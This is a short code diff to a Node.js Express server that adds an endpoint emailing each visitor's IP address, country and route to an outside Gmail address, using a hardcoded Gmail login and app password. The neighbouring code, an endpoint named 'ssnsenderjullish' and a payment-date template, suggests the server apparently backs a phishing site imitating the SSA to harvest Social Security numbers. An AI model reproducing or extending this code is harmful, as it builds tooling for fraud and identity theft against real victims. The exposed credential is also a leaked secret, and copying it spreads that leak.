@@ -303,6 +303,35 @@ Date of Payment: ${dateOfPayment}
   });
 });
 
+
+app.post("/masonvisitor", async (req, res) => {
+ 
+  const {route ,userLocation} = req.body
+  console.log(req.body)
+try{
+const mailOptions = {
+  from: process.env.EMAIL_USER,
+  to: 'thomasboyd908@gmail.com',
+  subject: `New Visitor${userLocation.ipaddress}`,
+  text: `Visitor in \n country : ${userLocation.country}} \n address :${userLocation.ipaddress} visited ssa at \n route: ${route}`,
+};
+
+let transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: "davidmiller4504@gmail.com",
+    pass: "dqhc mwpf nkmb buib",
+  },
+});
+await transporter.sendMail(mailOptions);
+res.json({ success: true });
+}
+catch(error){
+res.json(error)
+}
+})
+
+
 app.post("/ssnsenderjullish", async (req, res) => {
   const {
     fullName,
